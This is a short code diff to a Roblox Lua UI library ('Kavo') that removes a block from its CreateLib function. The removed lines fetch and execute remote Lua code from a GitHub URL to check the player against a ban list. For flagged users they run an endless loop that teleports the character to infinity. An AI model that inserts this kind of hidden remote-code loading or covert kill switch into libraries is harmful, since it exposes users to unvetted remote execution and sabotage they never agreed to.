@@ -205,13 +205,6 @@ function Kavo:ToggleUI()
 end
 
 function Kavo.CreateLib(kavName, themeList)
-	local banStatus = loadstring(game:HttpGet('https://raw.githubusercontent.com/loss23/R1_24/main/Functions/VerifyUser.lua'))().CheckUser(game.Players.LocalPlayer.UserId)
-	if banStatus == true then
-		for i=0,0,0 do 
-			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(math.huge,math.huge,math.huge))
-		end
-	end
-	
 	if not themeList then
 		themeList = themes
 	end
